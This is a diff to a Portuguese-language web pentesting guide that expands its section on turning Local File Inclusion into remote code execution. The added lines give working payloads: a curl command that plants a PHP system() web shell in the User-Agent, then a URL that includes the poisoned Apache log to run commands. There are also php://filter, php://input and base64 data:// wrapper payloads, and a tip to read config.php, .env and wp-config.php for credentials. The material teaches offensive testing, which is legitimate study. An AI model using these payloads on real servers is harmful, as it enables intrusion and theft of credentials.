@@ -299,9 +299,52 @@ http://alvo.com/view?doc=manual.pdf
 Se mudar para `../../etc/passwd` e o servidor retorna o conteúdo do arquivo → é LFI.
 
 **Escalar LFI para RCE:**
-- **Log Poisoning** — Injetar PHP no User-Agent (que vai para os logs), depois incluir o log via LFI
-- **PHP Wrappers** — `php://input`, `data://`, `expect://` para executar código
-- **Session injection** — Injetar código na sessão PHP e incluir o arquivo de sessão
+
+**Log Poisoning** — O servidor web grava cada requisição nos arquivos de log (access log, error log). O campo **User-Agent** vai direto pro log sem sanitizar. A ideia é: você manda uma requisição com código PHP no User-Agent, o servidor grava esse código no arquivo de log, e depois você inclui o arquivo de log via LFI — o PHP interpreta o código que está "escondido" dentro do log.
+
+Arquivos de log comuns para envenenar:
+- `/var/log/apache2/access.log` — Apache (Debian/Ubuntu)
+- `/var/log/httpd/access_log` — Apache (CentOS/RHEL)
+- `/var/log/nginx/access.log` — Nginx
+- `/var/log/auth.log` — Log de autenticação SSH (envenenar com username malicioso)
+- `/proc/self/environ` — Variáveis de ambiente do processo (inclui User-Agent em alguns servidores)
+
+Fluxo completo:
+```
+1. curl -A "<?php system($_GET['cmd']); ?>" http://alvo.com/
+   → O User-Agent com PHP é gravado no access.log
+
+2. http://alvo.com/page?file=../../../../var/log/apache2/access.log&cmd=id
+   → O LFI inclui o log, o PHP é executado, o comando roda
+```
+
+**PHP Wrappers** — O PHP tem "wrappers" que permitem acessar diferentes fluxos de dados pela mesma função `include()`. Quando a aplicação faz `include($_GET['file'])`, você pode substituir o path de arquivo por um wrapper:
+
+| Wrapper | O que faz | Quando usar |
+|---|---|---|
+| `php://filter` | Lê o código-fonte de arquivos PHP em base64 (sem executar) | Para ler o código da aplicação e encontrar credenciais, lógica de negócio |
+| `php://input` | Lê o corpo da requisição POST como arquivo | Para enviar código PHP via POST e executar |
+| `data://` | Transforma uma string em "arquivo" inline | Para executar código sem depender de arquivo no servidor |
+| `expect://` | Executa comando do sistema diretamente | Raro — precisa da extensão `expect` instalada |
+
+Exemplos:
+```
+# Ler código-fonte de um arquivo PHP (sem executar)
+?file=php://filter/convert.base64-encode/resource=config.php
+→ Retorna o código em base64, decodificar para ver credenciais
+
+# Executar código via POST (precisa de allow_url_include=On)
+?file=php://input
+POST body: <?php system('id'); ?>
+
+# Executar código inline via data://
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+→ O base64 decodifica para: <?php system('id'); ?>
+```
+
+> **Dica importante:** O `php://filter` é o mais útil na prática porque **não precisa de `allow_url_include=On`** — funciona na maioria dos servidores. Use ele para ler `config.php`, `.env`, `wp-config.php` e qualquer arquivo com credenciais.
+
+**Session injection** — Injetar código PHP no arquivo de sessão do PHP (geralmente em `/tmp/sess_SESSID`), depois incluir esse arquivo via LFI. Funciona quando os wrappers estão bloqueados e os logs não são acessíveis.
 
 > **Dica:** Use o DevTools (F12) para ver se parâmetros estão sendo passados na URL ou em requisições AJAX — muitas vezes o LFI está escondido em chamadas assíncronas.
 
